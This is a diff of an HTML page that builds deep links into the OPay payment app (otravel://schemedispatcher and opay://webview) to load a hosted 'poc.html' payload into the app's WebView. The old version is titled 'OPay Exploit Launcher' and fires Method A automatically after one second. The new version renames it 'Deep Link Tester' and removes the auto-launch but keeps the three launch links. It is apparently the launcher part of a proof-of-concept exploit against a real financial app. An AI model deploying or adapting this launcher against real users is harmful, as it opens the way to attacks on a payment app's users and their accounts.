@@ -1,83 +1,47 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPay Launcher</title>
+    <title>OPay Deep Link Tester</title>
     <style>
-        body {
-            font-family: sans-serif;
-            padding: 20px;
-            text-align: center;
-            background: #f0f0f0;
-        }
-
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: #00c853;
-            color: white;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 16px;
-        }
-
-        .btn.secondary {
-            background: #555;
-            font-size: 14px;
-        }
-
-        .status {
-            margin-bottom: 20px;
-            color: #333;
-            font-size: 14px;
-        }
-
-        .small {
-            font-size: 12px;
-            color: #777;
-            margin-top: 30px;
-        }
+        body { font-family: sans-serif; padding: 20px; text-align: center; background: #f0f0f0; }
+        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; background: #00c853; color: #fff; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 16px; }
+        .btn.secondary { background: #555; font-size: 14px; }
+        .status { margin-bottom: 20px; color: #333; font-size: 14px; }
+        .small { font-size: 12px; color: #777; margin-top: 20px; word-break: break-all; }
     </style>
 </head>
 
 <body>
-    <h3>OPay Exploit Launcher</h3>
-    <div class="status" id="status">Select a launch method:</div>
+    <h3>OPay Deep Link Tester</h3>
+    <div class="status" id="status">Tap a method to test WebView launch.</div>
 
-    <a id="btnA" class="btn" href="#" onclick="setStatus('Launching Method A...')">Method A (Standard)</a>
-    <a id="btnB" class="btn secondary" href="#" onclick="setStatus('Launching Method B...')">Method B (WebView)</a>
-    <a id="btnC" class="btn secondary" href="#" onclick="setStatus('Launching Method C...')">Method C (AppLink)</a>
+    <a id="btnA" class="btn" href="#" onclick="setStatus('Opening Method A...')">Method A: otravel scheme=</a>
+    <a id="btnB" class="btn secondary" href="#" onclick="setStatus('Opening Method B...')">Method B: opay://webview</a>
+    <a id="btnC" class="btn secondary" href="#" onclick="setStatus('Opening Method C...')">Method C: otravel action=</a>
 
-    <div class="small">payload: poc.html</div>
+    <div class="small" id="payload"></div>
 
     <script>
         var b = window.location.href.split('?')[0].split('#')[0];
         var base = b.substring(0, b.lastIndexOf('/') + 1);
-        var PAYLOAD = base + "poc.html?v=" + new Date().getTime();
+        var payload = base + 'v2/poc.html?v=' + Date.now();
+        var encoded = encodeURIComponent(payload);
 
-        // Define schemes
-        var A = "otravel://schemedispatcher?action=" + PAYLOAD;
-        var B = "opay://webview?url=" + encodeURIComponent(PAYLOAD);
-        var C = "opay://applink?url=" + encodeURIComponent(PAYLOAD);
+        var A = 'otravel://schemedispatcher?scheme=' + encoded;
+        var B = 'opay://webview?url=' + encoded;
+        var C = 'otravel://schemedispatcher?action=' + encoded;
 
-        document.getElementById("btnA").href = A;
-        document.getElementById("btnB").href = B;
-        document.getElementById("btnC").href = C;
+        document.getElementById('btnA').href = A;
+        document.getElementById('btnB').href = B;
+        document.getElementById('btnC').href = C;
+        document.getElementById('payload').textContent = 'payload: ' + payload;
 
         function setStatus(msg) {
-            document.getElementById("status").innerText = msg;
+            document.getElementById('status').innerText = msg;
         }
-
-        // Auto-launch Method A after 1s
-        setTimeout(function () {
-            setStatus("Auto-launching Method A...");
-            window.location.href = A;
-        }, 1000);
     </script>
 </body>
 
